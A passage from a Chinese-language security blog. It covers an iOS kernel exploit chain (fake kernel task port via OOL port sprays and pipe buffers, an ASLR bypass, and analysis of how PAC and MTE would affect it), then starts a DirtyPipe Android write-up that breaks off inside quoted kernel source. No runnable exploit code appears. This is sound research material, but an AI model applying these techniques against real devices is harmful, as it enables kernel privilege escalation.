class="line">        assert(port-&gt;ip_sorights &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        ip_unlock(port);</span><br><span class="line">        <span class="keyword">goto</span> invalid_right;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      port-&gt;ip_srights++;</span><br><span class="line">      ip_reference(port);</span><br><span class="line">      ip_unlock(port);</span><br><span class="line"></span><br><span class="line">      *objectp = (<span class="type">ipc_object_t</span>)port;</span><br><span class="line">      *sorightp = IP_NULL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    invalid_right:</span><br><span class="line">      <span class="keyword">return</span> KERN_INVALID_RIGHT;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IPC条目中的<code>ie_bits</code>是用来检查我们的权限的。如果我们想利用这条消息中的发送权限，我们可以将权限复制到消息中，这段代码在更新相关的引用计数之前，先检查我们在<code>ie_bits</code>中是否有权限，最后让我们访问可以<code>enqueue</code>消息的端口对象。如果我们没有根据<code>entry-&gt;ie_bits</code>的权限，那么发送消息的尝试就会失败。</p>
<p>现在我们的消息已经被复制、验证并更新为包含真正的内核对象指针，<code>ipc_kmsg_send</code>继续前进并将我们的消息添加到目标队列中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">mach_msg_return_t</span> <span class="title function_">ipc_kmsg_send</span><span class="params">(<span class="type">ipc_kmsg_t</span> kmsg, <span class="type">mach_msg_option_t</span> option,</span></span><br><span class="line"><span class="params">                                <span class="type">mach_msg_timeout_t</span> send_timeout)</span> &#123;</span><br><span class="line">  <span class="type">ipc_port_t</span> port;</span><br><span class="line">  <span class="type">thread_t</span> th = current_thread();</span><br><span class="line">  <span class="type">mach_msg_return_t</span> error = MACH_MSG_SUCCESS;</span><br><span class="line">  <span class="type">boolean_t</span> kernel_reply = FALSE;</span><br><span class="line"></span><br><span class="line">  port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">  assert(IP_VALID(port));</span><br><span class="line">  ip_lock(port);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (port-&gt;ip_receiver == ipc_space_kernel) &#123;</span><br><span class="line">    port-&gt;ip_messages.imq_seqno++;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line"></span><br><span class="line">    kmsg = ipc_kobject_server(kmsg, option);</span><br><span class="line">    <span class="keyword">if</span> (kmsg == IKM_NULL) <span class="keyword">return</span> MACH_MSG_SUCCESS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restart the KMSG_INFO tracing for the reply message */</span></span><br><span class="line">    port = (<span class="type">ipc_port_t</span>)kmsg-&gt;ikm_header-&gt;msgh_remote_port;</span><br><span class="line">    assert(IP_VALID(port));</span><br><span class="line">    ip_lock(port);</span><br><span class="line">    <span class="comment">/* fall thru with reply - same options */</span></span><br><span class="line">    kernel_reply = TRUE;</span><br><span class="line">    <span class="keyword">if</span> (!ip_active(port)) error = MACH_SEND_INVALID_DEST;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">    ip_unlock(port);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    error = ipc_mqueue_send(&amp;port-&gt;ip_messages, kmsg, option, send_timeout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上面可以看出，如果目的端口的<code>ip_receiver</code>是内核IPC空间，<code>ipc_kobject_server</code>作为特例被调用来处理内核消息。内核任务端口的<code>ip_receiver</code>是内核IPC空间，所以我们在安排tfp0的时候一定要复制。</p>
<p>我们要在IPC空间中添加一个IPC条目，<code>ie_object</code>指向内核任务端口，<code>ie_bits</code>表示我们有一个发送权。下面是它的样子：</p>
<p><img src="https://1.bp.blogspot.com/-kUj5tXrfmhc/Xe_gowmkyNI/AAAAAAAAOqc/H4UhPcVZkuopQbU03xGOimtMmOZCVLLRgCEwYBhgL/s640/2-2.png" alt="img"></p>
<h2 id="绕过ASLR并伪造数据结构"><a href="#绕过ASLR并伪造数据结构" class="headerlink" title="绕过ASLR并伪造数据结构"></a>绕过ASLR并伪造数据结构</h2><p>IPC系统一般都需要一种方法来序列化文件描述符，并通过管道发送，内核需要理解这种约定来进行适当的核算。Mach也不例外。Mach端口和文件描述符一样，可以由一个进程向另一个进程发送，并附加发送权限。你可以使用一个包含<code>mach_msg_ool_descriptor_t</code>的特殊消息，从一个进程向另一个进程发送一个<strong>行外</strong>端口。如果你想在一个消息中发送多个端口，你可以发送 <code>mach_msg_ool_ports_descriptor_t</code>，这是一个存储在行外（OOL）的端口数组，意思是在消息头本身之外。</p>
<p>我们和其他许多人一样，将在我们的开发中使用OOL端口描述符。</p>
<p>OOL端口数组之所以如此有用，是因为你可以完全控制数组的大小。当你传入一个由mach端口名组成的数组时，内核将为任意数量的指针分配空间，每一个指针都充满了指向我们要发送的<code>ipc_port</code>结构的指针。如果你没有注意到，我们可以使用这个技巧作为ASLR的旁路，因为我们可以将一个端口指针的OOL描述符数组与释放的大小为192的缓冲区重叠，然后简单地通过<code>getockopt</code>从释放的结构中读取两个相邻的int字段。这时我们就可以开始用我们的任意读取遍历内核数据结构了。</p>
<p>很多利用都会把一个bug变成一个读原语。我们有一个罕见的特权，那就是在进行任何破坏之前就有一个可靠的读原语，所以我们利用这一点结合这个指针披露来泄露所有相关的指针来完成利用，包括在一个已知地址上设置手工数据。我们现在就去做所有必要的遍历，你可以在下面看到。</p>
<p><img src="https://1.bp.blogspot.com/-4waCxHiWNR0/Xe_go0-6CYI/AAAAAAAAOqU/Ziz8NkBkqasC61FGcv4KM75K618GWow0QCEwYBhgL/s640/3-3.png" alt="img"></p>
<p>上面绿色的节点代表我们探索的种子值，橙色的节点代表我们要找的值。通过在消息中喷出一个包含指向代表我们主机端口的<code>ipc_port</code>结构的指针的OOL端口描述符数组，我们找到它的<code>ipc_port</code>，它将通过接收器字段给我们提供<code>ipc_space_kernel</code>。</p>
<p>我们重复同样的初始技巧，为我们自己的任务找到<code>ipc_port</code>。从那里我们找到我们的任务的文件描述符表，然后用它来找到一个用于<code>socket</code>选项和管道缓冲区的<code>vtable</code>。<code>vtable</code>将给我们提供进入内核缓存二进制的指针。因为内核进程的BSD表示<code>kernproc</code>是在<code>bsd/kern/bsd_init.c</code>中全局分配的，所以我们可以使用<code>socketops</code>表中的已知偏移量来找到它，并查找<code>kernel_task</code>的地址。</p>
<p>管道缓冲区是通过调用pipe()系统调用创建的，它分配了一个缓冲区，<strong>我们可以通过文件描述符来写入和读取，这是一个众所周知的技巧，用于在已知地址下获取已知数据</strong>。为了制作我们将注入IPC空间的假<code>ipc_port</code>，我们创建一个管道，并向它发送数据。管道将排队的数据存储到内核堆上的一个缓冲区，通过通用的基于大小的区域分配。我们可以通过对相关管道文件描述符的读写，从用户空间反复读写该缓冲区，而这些数据则存储在内核内存中。通过知道我们管道的缓冲区地址，我们就可以在那里存储受控数据，并为其创建指针。我们将需要这些来为内核任务制作一个制作的<code>ipc_port</code>。</p>
<p>所以我们现在可以创建一个假的<code>ipc_port</code>并把它指向<code>kernel_task</code>和<code>ipc_space_kernel</code>， 对吗？我现在应该指出，即使我们可以调用<code>task_for_pid(0)</code>并获得一个<code>kernel_task</code>端口，我们也不能向它发送消息。当内核将一个任务的 <code>ipc_port</code>转化为任务结构时，任何试图向<code>kernel_task</code>发送消息的用户区任务都会被阻止。这在<code>task_conversion_eval</code>中实现。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_conversion_eval</span><span class="params">(<span class="type">task_t</span> caller, <span class="type">task_t</span> victim)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Tasks are allowed to resolve their own task ports, and the kernel is</span></span><br><span class="line"><span class="comment">         * allowed to resolve anyone&#x27;s task port.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (caller == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (caller == victim) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Only the kernel can can resolve the kernel&#x27;s task port. We&#x27;ve established</span></span><br><span class="line"><span class="comment">         * by this point that the caller is not kernel_task.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (victim == TASK_NULL || victim == kernel_task) &#123;</span><br><span class="line">                <span class="keyword">return</span> KERN_INVALID_SECURITY;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>我使用了很多人使用过的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/08/in-wild-ios-exploit-chain-2.html">技巧</a>，简单地创建了一个<code>kernel_task</code>对象的副本，这样他们使用的指针比较就不会检测到我在向假的<code>kernel_task</code>对象发送消息。它不是真正的<code>kernel_task</code>并不重要，因为用一个假的<code>kernel_task</code>来支持<code>mach_vm_*</code>函数是很简单的，我们只需要复制内核的<code>kernel_map</code>和初始化一些其他的字段。在上图中你可以看到，我们可以简单地从<code>kernel_task</code>中提取，我们已经知道它的地址。我们将在管道缓冲区中存储与假<code>ipc_port</code>相邻的假内核任务。</p>
<h2 id="注入kernel-task端口"><a href="#注入kernel-task端口" class="headerlink" title="注入kernel_task端口"></a>注入kernel_task端口</h2><p>我们现在要使用OOL端口描述符数组做另一个用途。我们向自己发送一条消息，其中包含一个OOL数组，该数组包含我们的任务端口名称的副本，我们有发送权。发送权的验证最初发生在消息被发送的时候，所以如果我们在等待发送的时候编辑数组，我们可以覆盖其中一个<code>ipc_ports</code>，指向我们的假的<code>kernel_task ipc_port</code>。这个技巧改编自Stefan Esser关于这个主题的出色<a target="_blank" rel="noopener" href="https://www.slideshare.net/i0n1c/cansecwest-2017-portal-to-the-ios-core">演讲</a>，并且已经被用于一些漏洞的利用。请注意，<code>ipc_port</code>本身并没有发送或接收权限的概念；这些权限是作为<code>ipc_entry</code>的一部分被跟踪的，并且在<code>ipc_port</code>之外被处理。这是有道理的，因为一个端口封装了一个给定的消息队列。向该队列发送或接收的权限是每个进程所特有的，因此我们可以看到为什么这些信息会独立地存储在每个进程的表中。</p>
<p>尽管这种在OOL端口描述符数组中覆盖指针的技巧是一种已知的利用技术，但如何真正使这种破坏发生，要由利用开发者来想办法。我们有一个任意读取和任意释放。OOL端口描述符数组和管道缓冲区是在全局区外分配的。前面我们记下了管道缓冲区的地址。所以我们只需要释放管道缓冲区的实际缓冲区地址，并喷涂OOL端口描述符数组。然后我们读取管道缓冲区寻找我们任务的<code>ipc_port</code>，用我们的假端口指针覆盖它。然后我们将消息传递给自己，并检查我们是否成功注入了假的内核任务端口。</p>
<p>此时，我们有了tfp0。就像<code>voucher_swap</code>和其他漏洞一样，我们要使用这个临时的tfp0使用管道缓冲结构来引导一个更稳定的tfp0。我们通过使用内核任务端口来分配一页专门用于存储我们的数据的内核内存，然后使用写原语将我们的假任务端口和<code>kernel_task</code>写入那里。然后我们改变我们的IPC空间条目，使之指向这个新的<code>ipc_port</code>。</p>
<p>我们仍然有一个管道结构，它有一个指向释放的缓冲区的悬空指针。我们不想让它在关闭fd时double-free，所以我们使用新的稳定的tfp0来清空这个指针。我们基本上做了两个动作来破坏内存：释放那个指针，并使用新的使用后释放的管道缓冲区来覆盖单个<code>ipc_port</code>指针，所以跟踪清理是相当直接的。</p>
<h2 id="评估PAC和MTE"><a href="#评估PAC和MTE" class="headerlink" title="评估PAC和MTE"></a>评估PAC和MTE</h2><p>因为这个漏洞是基于内存损坏的bug，所以不同的缓解措施对它的影响是一个挥之不去的问题。通过A12芯片，苹果为iOS带来了PAC(指针认证)，这似乎是为了限制内核代码的执行，假设任意的内核读写等目标。这听起来是一个很强的缓解措施，如果没有实际经验，我不知道利用情况如何。我是在A9芯片上测试的，所以我只是希望我的利用中不会做任何会被PAC缓解的事情。事实果然如此。因为我的漏洞只针对数据结构，不涉及任意代码执行，所以没有代码指针可以伪造。</p>
<p>iOS 13开始引入了对一些数据指针的保护，所以值得研究一下我需要伪造哪些指针才能让这个漏洞在数据PAC的情况下发挥作用。PAC通过用私钥和指针本身在栈上的位置作为上下文值进行签名来保护栈上的返回地址不被破坏。但是，其他代码指针的签名是没有上下文值的。同样，数据PAC的有效性很可能取决于苹果选择如何使用上下文值。</p>
<p>让我们考虑一下这样的情况：所有的数据指针都是受保护的，但没有基于位置的上下文签名。在这种情况下，只要我们设法泄露它们，我们就可以将它们从一个位置复制到另一个位置。这就是比较有名的 “指针替换攻击”，Brandon在他关于PAC的<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">博文</a>中已经描述过。</p>
<p>我们的读原语在数据PAC的上下文中仍然有效，因为我们的悬空指针仍然是签名的。我们最终需要伪造或替换几个攻击者来源的指针：<code>ipc_space_kernel</code>、<code>kernel_map</code>、<code>&amp;fake_port</code>和<code>&amp;fake_task</code>，以及找到它们所需的所有中间读。回顾一下，<code>&amp;fake_port</code>和<code>&amp;fake_task</code>是指向管道缓冲区的指针。对于我们的初始入口点，<code>pktoininfo</code>指针是否受保护并不重要，因为我们必须通过OOL端口喷涂来泄露一个真正的<code>ipc_port</code>指针。这意味着我们可以收集一个签名的<code>ipc_port</code>，然后做所有我们已经做的前期数据结构遍历，复制PAC数据指针没有问题，<code>ipc_space_kernel</code>和<code>kernel_map</code>已经被签名了，如果管道缓冲区被签名了，我们可以简单地将假的端口和任务分割到两个管道缓冲区，然后获得每个缓冲区的签名指针。在任何情况下，这个漏洞都不会完全开箱即用，因为我们确实伪造了一个指针到文件描述符表中去查找任意的fd结构，而且有些查找可能需要读取超过20字节的数据。不过，我相信读取原语的功能足够强大，可以在不费吹灰之力的情况下解决这些漏洞。</p>
<p>实际上iOS 13只保护一些数据指针，矛盾的是这可能会提高终端用户的安全性。例如，如果管道缓冲区不受保护，如果端口的指针是有签名的，那么简单地泄露一个缓冲区的地址不太可能让我们用这个指针来表示一个假的ipc_port。对17B5068e的内核缓存进行检查后发现，IPC端口指针确实没有受到保护，但根据苹果今年早些时候的BlackHat演讲，我认为他们计划这样做（或者已经在非beta构建中这样做了）。就像任何缓解措施与提供强大初始原语的bug相结合一样，这只是一个设计替代利用技术的问题。在不考虑哪些指针应该被保护或不保护的捶胸顿足的情况下，我希望在未来，尽可能多的指针都以位置作为上下文进行签名，以帮助缓解指针替换攻击的影响。从我们的思想实验中可以看出，如果数据指针只是简单地以上下文为0进行签名，那么，一个好的基于use-after-free的读取原语并没有什么好处。</p>
<p>另一个需要考虑的缓解措施是ARM的内存标签扩展（MTE），我相信苹果会尝试实现这个即将到来的CPU功能。对于这个缓解措施，这里和这里有一个很好的高层总结。实质上，内存分配器将为内存分配分配分配一个随机的标签，这个标签将成为指针上部未使用位的一部分，就像在PAC中一样。正确的标签值将被存储在行外，类似于ASAN如何将堆元数据存储在行外。当处理器去解除对指针的引用时，它会检查标签是否匹配。这个漏洞本来是可以被MTE缓解的，因为我们在漏洞中多次触发释放后的使用，每次访问释放的指针时，它的标签都会与释放范围的新标签或哪个分配回收缓冲区的标签进行比较。根据CPU或内核的配置，当一个不匹配的标签被识别出来时，会影响到如何进行利用。我希望苹果公司在标签检查失败时配置一个同步或异步异常，考虑到他们根据他们对PAC的LLVM文档，努力触发PAC违规的数据中止。”虽然ARMv8.3的aut*指令本身并不会在失败时触发异常，但编译器只会在会触发异常的序列中发出这些指令。”</p>
<h1 id="iOS-Exploit-Meta"><a href="#iOS-Exploit-Meta" class="headerlink" title="iOS Exploit Meta"></a>iOS Exploit Meta</h1><table>
<thead>
<tr>
<th><strong>Summary</strong></th>
<th><strong>Benefit</strong></th>
<th><strong>Used?</strong></th>
</tr>
</thead>
<tbody><tr>
<td>IOSurface subsystem</td>
<td>Spray arbitrary data of controlled contents and size in kernel address space</td>
<td>Yes</td>
</tr>
<tr>
<td>OOL port descriptor array</td>
<td>Spray arbitrary multiple of 8 array containing pointers to ipc_ports with send right</td>
<td>Yes</td>
</tr>
<tr>
<td>Pipe buffers</td>
<td>Repeatable read&#x2F;write from userland of malloced buffer without needing sprays</td>
<td>Yes</td>
</tr>
<tr>
<td>Looking around the host port for other early ports</td>
<td>Find the kernel task port</td>
<td>Yes, SockPuppetV1, replaced with my own variant later</td>
</tr>
<tr>
<td>Copying kernel_task task port to a new address</td>
<td>Bypass kernel_task task port check for messages coming from a user task</td>
<td>Yes</td>
</tr>
<tr>
<td>Creating a fake task port pointing to an arbitrary “task” and reading its PID</td>
<td>Repeatable arbitrary read</td>
<td>No, already had arbitrary read directly via first stage</td>
</tr>
<tr>
<td>Triggering zone allocator garbage collection</td>
<td>Reclaim an object from one zone with an object from another</td>
<td>No, all relevant objects were already in the generic size-based zones</td>
</tr>
</tbody></table>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">DirtyPipe-Android利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-28 19:33:20" itemprop="dateCreated datePublished" datetime="2022-03-28T19:33:20+08:00">2022-03-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-17 12:42:45" itemprop="dateModified" datetime="2022-04-17T12:42:45+08:00">2022-04-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。</p>
<p>该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。</p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每天对应网站每天的访问日志，在月末的时候，提供一个日志下载功能，当用户请求这个功能时，该功能通过HTTP，先发送一个ZIP头，再发送每天的日志压缩包，最后发送一个中央目录（就是另一个头的意思）。这个功能机遇splice()，可以将数据直接从硬盘发送到HTTP连接，省去了将所有日志文件再压缩到一起的这么一个操作，提高了响应效率。</p>
<p>但是，这个功能出现了bug。有用户反馈下载的日志文件损坏，无法解压，这个bug被反馈了很多次。结果就是，漏洞提交者开始找bug，千辛万苦，发现了个新漏洞，可怜的程序员。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
<li><strong>页面</strong>，基于虚拟内存的操作系统中用于内存管理的最小数据单元，最小大小为4kb。</li>
<li><strong>页面缓存</strong>，最近访问过的内存页面，存储在内存中，以加快访问速度，当内核认为该页面不再需要时，就会回收这些页面。通过页面缓存，系统可以直接将页面映射到用户空间，这样就去除了复制的成本。</li>
<li><strong>管道</strong>，对于进程间通信而言，通常使用共享内存页面，其中一个进程读取，另一个进程写入，通常管道跨越多个内存页。</li>
<li><strong>匿名管道</strong>，当进程间共享的信息不占用整个内存页时，可以被另一个管道重用，导致来自不同管道的数据共存于同一个内存页中。</li>
<li><strong>管道标志</strong>，管道标志指定状态和权限等特征。</li>
</ul>
<p><code>splice()</code>在将数据从文件拷贝到管道中时，首先将数据加载到页面缓存中，然后在页面缓存中创建一个<code>struct pipe_buffer</code>指针，但是不同于匿名管道，随后写入的数据不能附加到该页面上，因为该页面的持有者为页面缓存。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道是内核提供的一种通信机制，由pipe&#x2F;pipe2函数创建，返回两个文件描述符，一个读取，一个写入。</p>
<p><strong>管道在内核中的实现方式</strong></p>
<p>通常管道的缓存空间总长度为65536 个字节，用页的形式进行管理，一共16页，每页4096字节，形成一个环形链表，结构如下：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124007780.png" alt="image-20220309124007780" style="zoom:67%;" />

<p>注意这里的16个页面并不连续，而是通过数组进行表示，<code>pipe-&gt;head</code>负责写入，<code>pipe-&gt;tail</code>负责读取。看一下<code>pipe_write</code>函数，关键之处在于第二步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="type">ssize_t</span> chars;</span><br><span class="line">	<span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line">    ··· ···</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">        <span class="comment">//[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">		<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            <span class="comment">/*[2]如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span></span><br><span class="line"><span class="comment">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			···</span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">			···</span><br><span class="line">			&#125;</span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			···</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;<span class="comment">//[3]如果上一页没法接着写，则重新起一页</span></span><br><span class="line">		··· ···</span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;<span class="comment">//[4]重新申请一个新页</span></span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span 